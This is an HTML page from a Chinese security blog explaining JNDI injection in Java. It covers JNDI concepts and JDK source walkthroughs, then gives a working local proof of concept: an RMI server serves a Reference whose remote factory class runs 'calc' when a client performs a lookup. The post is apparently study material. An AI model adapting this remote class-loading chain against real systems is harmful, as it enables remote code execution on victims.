@@ -1,0 +1,874 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JNDI注入 | Bloyet&#39;s blog</title>
+<link rel="shortcut icon" href="https://bloyet.github.io/favicon.ico?v=1752383988636">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bloyet.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JNDI注入 | Bloyet&#39;s blog - Atom Feed" href="https://bloyet.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="参考文献：
+Java安全学习——JNDI注入 - 枫のBlog
+JNDI重看 | stoocea’s blog
+JNDI简述
+JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://bloyet.github.io">
+  <img class="avatar" src="https://bloyet.github.io/images/avatar.png?v=1752383988636" alt="">
+  </a>
+  <h1 class="site-title">
+    Bloyet&#39;s blog
+  </h1>
+  <p class="site-description">
+    做那个人的战士，和他一起去经历，失败!
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Home
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/friends" class="menu">
+          Friends
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JNDI注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-06-10
+              </span>
+              <span>
+                24 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>参考文献：</p>
+<p><a href="https://goodapple.top/archives/696">Java安全学习——JNDI注入 - 枫のBlog</a></p>
+<p><a href="https://stoocea.github.io/post/JNDIRe0.html#%E4%BB%80%E4%B9%88%E6%98%AF-JNDI">JNDI重看 | stoocea’s blog</a></p>
+<h1 id="jndi简述">JNDI简述</h1>
+<p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务</p>
+<h2 id="命名服务naming-server">命名服务（Naming Server）</h2>
+<p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p>
+<p>在命名服务中，有几个重要的概念。</p>
+<ul>
+<li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。</li>
+<li><strong>Context</strong>：上下文，一个上下文中对应着<strong>一组名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。</li>
+<li><strong>References</strong>：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
+</ul>
+<h2 id="目录服务directory-service">目录服务（Directory Service）</h2>
+<p>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。</p>
+<p>一些常见的目录服务有：</p>
+<ul>
+<li>LDAP： 轻型目录访问协议</li>
+<li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li>
+<li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li>
+</ul>
+<h2 id="jndi-spi">JNDI SPI</h2>
+<p>JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 SPI，如下图所示</p>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749492628850.png" alt="" loading="lazy"></figure>
+<p>SPI（Service Provider Interface），即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。</p>
+<p>JDK 中包含了下述内置的命名目录服务:</p>
+<ul>
+<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
+<li>LDAP: 轻量级目录访问协议</li>
+<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
+<li>DNS（域名转换协议）</li>
+</ul>
+<p>除此之外，用户还可以在 Java 官网下载其他目录服务实现。由于 SPI 的统一接口，厂商也可以提供自己的私有目录服务实现，用户无需重复修改代码。</p>
+<h1 id="jndi代码示例">JNDI代码示例</h1>
+<p>JNDI 接口主要分为下述 5 个包:</p>
+<ul>
+<li><code>javax.naming</code>：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类</li>
+<li><code>javax.naming.directory</code>：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</li>
+<li><code>javax.naming.event</code>：在命名目录服务器中请求事件通知</li>
+<li><code>javax.naming.ldap</code>：提供LDAP服务支持</li>
+<li><code>javax.naming.spi</code>：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</li>
+</ul>
+<p>下面我们通过具体代码来看看JNDI是如何实现与各服务进行交互的。</p>
+<h2 id="jndirmi">JNDI+RMI</h2>
+<h3 id="rmi接口">RMI接口：</h3>
+<pre><code class="language-java">package org.example;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface Remoteobj extends Remote {
+    public String sayHello(String kaywords) throws RemoteException;
+    
+}
+</code></pre>
+<h3 id="rmi远程对象实现类">RMI远程对象（实现类）</h3>
+<pre><code class="language-java">package org.example;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RemoteobjImpl extends UnicastRemoteObject implements Remoteobj {
+    protected RemoteobjImpl() throws RemoteException {
+    }
+
+    @Override
+    public String sayHello(String keywords) throws RemoteException {
+        String upkeywords = keywords.toUpperCase();
+        System.out.println(upkeywords);
+        return upkeywords;
+    }
+
+   
+}
+</code></pre>
+<h3 id="rmi服务端">RMI服务端：</h3>
+<pre><code class="language-java">package org.example;
+import java.rmi.Naming;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMIServer {
+    public static void main(String[] args) throws RemoteException, AlreadyBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, MalformedURLException {
+
+
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Remoteobj remoteobj = new RemoteobjImpl();
+       
+        Naming.bind(&quot;Bloyet&quot;, remoteobj);
+    }
+</code></pre>
+<h3 id="客户端">客户端：</h3>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+
+
+public class JNDI {
+    public static void main(String[] args) throws NamingException, RemoteException {
+       Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+        
+        //初始化上下文
+        Context initialContext = new InitialContext(env);
+ 
+        //调用远程类
+        Remoteobj remoteobj = (Remoteobj) context.lookup(&quot;Bloyet&quot;);
+        remoteobj.sayHello(&quot;Hello World&quot;);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749492628865.png" alt="" loading="lazy"></figure>
+<h2 id="jndi-dns">JNDI + DNS</h2>
+<p>我们通过JNDI成功地调用了RMI和DNS服务。那么对于JNDI来讲，它是如何识别我们调用的是何种服务呢？这就依赖于我们上面提到的Context（上下文）了。</p>
+<h1 id="jndi的工作流程">JNDI的工作流程</h1>
+<p>我们就拿我们熟悉一点的RMI举例：</p>
+<pre><code class="language-java">        //设置JNDI环境变量
+        Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+        
+        //初始化上下文
+        Context initialContext = new InitialContext(env);
+</code></pre>
+<p>首先使用<code>Hashtable</code>类来设置属性<code>*INITIAL_CONTEXT_FACTORY*</code>和<code>*PROVIDER_URL*</code>的值。可以看到，这里我们将<code>*INITIAL_CONTEXT_FACTORY*</code>设置为了<code>&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</code>，JNDI正是通过这一属性来判断我们将要调用何种服务。</p>
+<p>接着我们将属性<code>PROVIDER_URL</code>设置为了<code>&quot;rmi://localhost:1099&quot;</code>，这正是我们RMI服务的地址。JNDI通过该属性来获取服务的路径，进而调用该服务。</p>
+<p>最后向<code>InitialContext</code>类传入我们设置的属性值来初始化一个<code>Context</code>，于是我们就获得了一个与RMI服务相关联的上下文<code>Context</code>。</p>
+<p>当然 与RMI一样，Context同样通过以下五种方法来与被调用的服务进行交互</p>
+<pre><code class="language-java">//将名称绑定到对象
+bind(Name name, Object obj)
+ 
+//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名
+list(String name) 
+ 
+//检索命名对象
+lookup(String name)
+ 
+//将名称重绑定到对象 
+rebind(String name, Object obj) 
+ 
+//取消绑定命名对象
+unbind(String name) 
+</code></pre>
+<h1 id="jndi底层代码实现">JNDI底层代码实现</h1>
+<h2 id="获取工厂类">获取工厂类</h2>
+<p>断点打在这里</p>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749492628881.png" alt="" loading="lazy"></figure>
+<p>进入构造函数，调用init函数</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749492628896.png" alt="" loading="lazy"></figure>
+<p>获取环境变量，以及刚刚我们在hashtable中设置的环境变量，然后继续调用getDefaultInitCtx()方法</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749492628927.png" alt="" loading="lazy"></figure>
+<p>调用NamingManager 的 <code>getInitialContext</code>方法，跟进</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749492628943.png" alt="" loading="lazy"></figure>
+<pre><code class="language-java">public static Context getInitialContext(Hashtable&lt;?,?&gt; env)
+    throws NamingException {
+    InitialContextFactory factory;
+
+    InitialContextFactoryBuilder builder = getInitialContextFactoryBuilder();
+    if (builder == null) {
+        // No factory installed, use property
+        // Get initial context factory class name
+
+        String className = env != null ?
+            (String)env.get(Context.INITIAL_CONTEXT_FACTORY) : null;
+        if (className == null) {
+            NoInitialContextException ne = new NoInitialContextException(
+                &quot;Need to specify class name in environment or system &quot; +
+                &quot;property, or as an applet parameter, or in an &quot; +
+                &quot;application resource file:  &quot; +
+                Context.INITIAL_CONTEXT_FACTORY);
+            throw ne;
+        }
+
+        try {
+            factory = (InitialContextFactory)
+                helper.loadClass(className).newInstance();
+        } catch(Exception e) {
+            NoInitialContextException ne =
+                new NoInitialContextException(
+                    &quot;Cannot instantiate class: &quot; + className);
+            ne.setRootCause(e);
+            throw ne;
+        }
+    } else {
+        factory = builder.createInitialContextFactory(env);
+    }
+
+    return factory.getInitialContext(env);
+}
+</code></pre>
+<p>这里首先通过<code>getInitialContextFactoryBuilder()</code>初始化了一个<code>InitialContextFactoryBuilder</code>类。如果该类为空，则将<code>className</code>设置为<code>*INITIAL_CONTEXT_FACTORY*</code>属性。还记得该属性是什么吗？就是我们手动设置的RMI上下文工厂类<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>       这里发现就是判断为空了，进入if语句  对classname进行赋值</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749492628959.png" alt="" loading="lazy"></figure>
+<p>接着往下看</p>
+<p>这里通过<code>loadClass()</code>来动态加载我们设置的工厂类。最终调用的其实是<code>RegistryContextFactory#getInitialContext()</code>方法，通过我们的设置工厂类来初始化上下文Context</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749492628974.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749492628990.png" alt="" loading="lazy"></figure>
+<h2 id="获取服务交互所需资源">获取服务交互所需资源</h2>
+<p>现在JNDI知道了我们想要调用何种服务，那么它又是如何知道服务地址以及获取服务的各种资源的呢？ 还是在刚刚那里，我们接着看</p>
+<pre><code class="language-java">RegistryContextFactory#getInitialContext()
+public Context getInitialContext(Hashtable&lt;?, ?&gt; var1) throws NamingException {
+    if (var1 != null) {
+        var1 = (Hashtable)var1.clone();
+    }
+
+    return URLToContext(getInitCtxURL(var1), var1);
+}
+</code></pre>
+<p>var1 就是我们设置的环境 ，先跟进getInitCtxURL</p>
+<p>JNDI通过我们设置的<code>*PROVIDER_URL*</code>环境变量来获取服务的路径</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749492629006.png" alt="" loading="lazy"></figure>
+<p>继续看 URLToContext</p>
+<p>初始化了一个new rmiURLContextFactory(); 然后调用了rmiURLContextFactory#getObjectInstance方法，跟进</p>
+<pre><code class="language-java">private static Context URLToContext(String var0, Hashtable&lt;?, ?&gt; var1) throws NamingException {
+    rmiURLContextFactory var2 = new rmiURLContextFactory();
+    Object var3 = var2.getObjectInstance(var0, (Name)null, (Context)null, var1);
+    if (var3 instanceof Context) {
+        return (Context)var3;
+    } else {
+        throw new NotContextException(var0);
+    }
+}
+</code></pre>
+<p>var1 不为空  进入第二个if 调用getUsingURL 方法，跟进</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749492629022.png" alt="" loading="lazy"></figure>
+<p>发现调用了lookup方法，那就跟进看看</p>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749492629037.png" alt="" loading="lazy"></figure>
+<p>rmiURLContext本身没有lookup方法，调用到了父类的lookup方法</p>
+<p>执行 getRootURLContext()方法获取解析结果，结果为图二，通过 getResolvedObj 方法取出 RegistryContext，然后继续调用lookup方法</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749492629068.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749492629053.png" alt="" loading="lazy"></figure>
+<p>RegistryContext#lookup</p>
+<p>进入if语句 ，返回   一个RegistryContext新的实例，在实例化的时候，把信息也传好了</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749492629084.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749492629101.png" alt="" loading="lazy"></figure>
+<p>流程：</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749492629116.png" alt="" loading="lazy"></figure>
+<h1 id="jndi动态协议转换">JNDI动态协议转换</h1>
+<p>实际上，在 Context#lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户的输入来动态的识别用户要调用的服务以及路径。来看下面的例子</p>
+<p>客户端：</p>
+<pre><code class="language-java">package org.example;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+
+public class JNDI {
+    public static void main(String[] args) throws NamingException, RemoteException {
+      
+        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
+        //初始化上下文
+        Context context = new InitialContext();
+
+        //调用远程类
+        Remoteobj remoteobj = (Remoteobj) context.lookup(string);
+        remoteobj.sayHello(&quot;Hello World&quot;);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749492629132.png" alt="" loading="lazy"></figure>
+<p>可以看到，我们并没有设置相应的环境变量来初始化Context，但是JNDI仍旧通过lookup()的参数识别出了我们要调用的服务以及路径，这就是JNDI的动态协议转换。</p>
+<h1 id="jndi动态协议转换底层分析">JNDI动态协议转换底层分析</h1>
+<p>断点打在</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749492629147.png" alt="" loading="lazy"></figure>
+<p>发现不管是调用lookup、bind或者是其他<code>initalContext</code>中的方法，都会先调用<code>getURLOrDefaultInitCtx()</code>方法进行检查。</p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749492629163.png" alt="" loading="lazy"></figure>
+<p>先跟进getURLOrDefaultInitCtx()方法</p>
+<p>会调用getURLScheme方法来获取通信的协议，这里获取到的就是rmi协议，然后把获取到的协议作为参数，调用getURLContext方法</p>
+<pre><code class="language-java">protected Context getURLOrDefaultInitCtx(String name)
+    throws NamingException {
+    if (NamingManager.hasInitialContextFactoryBuilder()) {
+        return getDefaultInitCtx();
+    }
+    String scheme = getURLScheme(name);
+    if (scheme != null) {
+        Context ctx = NamingManager.getURLContext(scheme, myProps);
+        if (ctx != null) {
+            return ctx;
+        }
+    }
+    return getDefaultInitCtx();
+}
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749492629179.png" alt="" loading="lazy"></figure>
+<p>跟进到NamingManager.getURLContext方法</p>
+<p>调用getURLObject，继续跟进</p>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749492629195.png" alt="" loading="lazy"></figure>
+<p>getURLObject()方法</p>
+<p>根据defaultPkgPrefix的属性来动态生成<code>Factory</code>类</p>
+<pre><code class="language-java">private static Object getURLObject(String scheme, Object urlInfo,
+                                   Name name, Context nameCtx,
+                                   Hashtable&lt;?,?&gt; environment)
+        throws NamingException {
+
+    // e.g. &quot;ftpURLContextFactory&quot;
+    ObjectFactory factory = (ObjectFactory)ResourceManager.getFactory(
+        Context.URL_PKG_PREFIXES, environment, nameCtx,
+        &quot;.&quot; + scheme + &quot;.&quot; + scheme + &quot;URLContextFactory&quot;, defaultPkgPrefix);
+
+    if (factory == null)
+      return null;
+
+    // Found object factory
+    try {
+        return factory.getObjectInstance(urlInfo, name, nameCtx, environment);
+    } catch (NamingException e) {
+        throw e;
+    } catch (Exception e) {
+        NamingException ne = new NamingException();
+        ne.setRootCause(e);
+        throw ne;
+    }
+
+}
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749492629211.png" alt="" loading="lazy"></figure>
+<p>只要是这个包下的都是可以进行转换的协议</p>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749492629226.png" alt="" loading="lazy"></figure>
+<p>通过动态协议转换，我们可以仅通过一串特定字符串就可以指定JNDI调用何种服务，十分方便。但是方便是会付出一定代价的。对于一个系统来讲，往往越方便，就越不安全。</p>
+<p>假如我们能够控制<code>string</code>字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的”远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行。</p>
+<h1 id="jndi-refernce-类">JNDI-Refernce 类</h1>
+<p>Reference类表示对存在于命名/目录系统以外的对象的引用，比如远程获取 RMI 服务上的对象是 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化</p>
+<p>有点像是RMI中Codebase的功能，在JNDI中我们可以利用Refernce进行调用远程服务器的类</p>
+<p>Reference类构造函数</p>
+<p>它的构造函数很多，这里就列举一种</p>
+<pre><code class="language-java">Reference(String className,  String factory, String factoryLocation) 
+</code></pre>
+<p>className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</p>
+<p>factory为工厂类名</p>
+<p>factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议</p>
+<p>在RMI中，由于我们远程加载的对象需要继承<code>UnicastRemoteObject</code>类，所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。</p>
+<h1 id="jndi注入">JNDI注入</h1>
+<p>大概的思路就是：</p>
+<p>受害者先向服务器请求一个Reference类，服务器返回一个Reference类，其中指明了需要创建的类，创建该类的工厂类，以及工厂类的地址</p>
+<p>然后受害者尝试在本地加载指定的工厂类，发现没有，就会对指定远程地址去进行下载，然后远处返回一个恶意字节码，受害者接受字节码</p>
+<p>将返回的字节码实例化，导致RCE</p>
+<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1749492629242.png" alt="" loading="lazy"></figure>
+<h2 id="jndirmi-2">JNDI+RMI</h2>
+<p>服务端：</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class JNDI_server {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>工厂类（恶意类）</p>
+<pre><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.rmi.server.UnicastRemoteObject;
+import java.util.Hashtable;
+
+public class RMIHello extends UnicastRemoteObject implements ObjectFactory {
+
+    public RMIHello() throws IOException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        return null;
+    }
+}
+</code></pre>
+<p>客户端：</p>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+
+public class JNDI {
+    public static void main(String[] args) throws Exception {
+     
+        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
+        //初始化上下文
+        Context context = new InitialContext();
+
+        //调用远程类
+        context.lookup(string);
+      
+
+    }
+}
+</code></pre>
+<p>利用python起个简单的http服务，然后启动服务端，在启动客户端。</p>
+<p>注意点：</p>
+<p>我们的工厂类最好是直接放在主目录下，不要放在模块下面，不然会提示找不到文件</p>
+<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1749492629273.png" alt="" loading="lazy"></figure>
+<p>成功弹出计算器</p>
+<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1749492629259.png" alt="" loading="lazy"></figure>
+<h3 id="流程分析">流程分析</h3>
+<p>JNDI 的动态协议转化导致我们能够从 Reference 类中读取地址，从恶意地址中获取恶意工厂类字节码内容，然后在本地进行实例化导致RCE</p>
+<p>下面看具体代码</p>
+<p>断点打在客户端</p>
+<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1749492629290.png" alt="" loading="lazy"></figure>
+<p>跟进getURLOrDefaultInitCtx</p>
+<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1749492629307.png" alt="" loading="lazy"></figure>
+<p>这里因为 URL 传值中制定了 RMI 协议，所以这里的 scheme 取出来是”RMI”，进入 if 判断完毕之后的内容，通过 NamingManager 的 getURLContext 的方法来获取 context，跟进</p>
+<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1749492629321.png" alt="" loading="lazy"></figure>
+<p>只有一个getURLObject方法，跟进</p>
+<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1749492629367.png" alt="" loading="lazy"></figure>
+<p>根据 scheme 的值构造出了 rmiURLContext 的构造实体 factory，然后调用factory.getObjectInstance，继续跟进</p>
+<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1749492629382.png" alt="" loading="lazy"></figure>
+<p>工厂类来获取 rmiURLContext 的内容，返回一个rmiURLContext实例</p>
+<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1749492629397.png" alt="" loading="lazy"></figure>
+<p>然后getURLOrDefaultInitCtx这一部分看完了，现在看lookup这一部分</p>
+<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1749492629413.png" alt="" loading="lazy"></figure>
+<p>rmiURLContext 本身没有 lookup 方法的定义，跟进到 GenericURLContext 的 lookup 方法</p>
+<p>getRootURLContext 方法和getResolvedObj都是为了去获得RegistryContext，然后调用RegistryContext.lookup方法</p>
+<p>继续跟进</p>
+<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1749492629429.png" alt="" loading="lazy"></figure>
+<p>然后这一部分就比较熟悉了，走到了RegistryImpl_Stub 部分了</p>
+<p>从远程客户端上请求字节码了，最后调用 decodeObeject 进行实例化，跟进decodeObeject方法</p>
+<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1749492629444.png" alt="" loading="lazy"></figure>
+<p>跟进getObjectInstance</p>
+<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1749492629460.png" alt="" loading="lazy"></figure>
+<p>跟进getObjectFactoryFromReference方法</p>
+<figure data-type="image" tabindex="38"><img src="https://bloyet.github.io/post-images/1749492629476.png" alt="" loading="lazy"></figure>
+<p>在这个方法中，调用了loadClass方法 加载字节码</p>
+<figure data-type="image" tabindex="39"><img src="https://bloyet.github.io/post-images/1749492629492.png" alt="" loading="lazy"></figure>
+<h2 id="jndildap">JNDI+LDAP</h2>
+<h3 id="ldap简介">LDAP简介</h3>
+<p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
+<p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p>
+<p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下</p>
+<pre><code class="language-java">dn ：一条记录的详细位置
+dc ：一条记录所属区域    (哪一颗树)
+ou ：一条记录所属组织    （哪一个分支）
+cn/uid：一条记录的名字/ID   (哪一个苹果名字)
+...
+LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。
+</code></pre>
+<p>我们也可以使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的。LDAP能够存储的Java对象如下</p>
+<ul>
+<li>Java 序列化</li>
+<li>JNDI的References</li>
+<li>Marshalled对象</li>
+<li>Remote Location</li>
+</ul>
+<h3 id="复现代码">复现代码</h3>
+<h4 id="环境配置">环境配置</h4>
+<p>先需要导入<a href="https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar">unboundid依赖库</a></p>
+<p>然后在项目结构中导入</p>
+<figure data-type="image" tabindex="40"><img src="https://bloyet.github.io/post-images/1749492629336.png" alt="" loading="lazy"></figure>
+<h4 id="代码">代码</h4>
+<p>先写个LDAP服务端：（直接AI就行）</p>
+<pre><code class="language-java">package org.example;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.io.IOException;
+import java.net.InetAddress;
+
+public class LDAP_server {
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+    public static void main(String[] args) throws IOException {
+        int port = 10389;
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, //$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
